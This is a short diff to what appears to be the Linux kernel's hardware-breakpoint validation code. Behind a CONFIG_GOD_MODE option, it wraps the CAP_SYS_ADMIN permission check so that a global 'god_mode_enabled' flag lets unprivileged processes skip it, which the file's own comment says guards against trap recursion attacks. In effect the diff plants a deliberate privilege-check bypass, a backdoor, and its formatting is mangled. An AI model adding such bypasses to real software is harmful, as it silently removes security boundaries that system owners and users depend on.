@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * This program is free software; you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -399,7 +402,15 @@ static int validate_hw_breakpoint(struct perf_event *bp)
 		 * path to avoid trap recursion attacks.
 		 */
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	return 0;
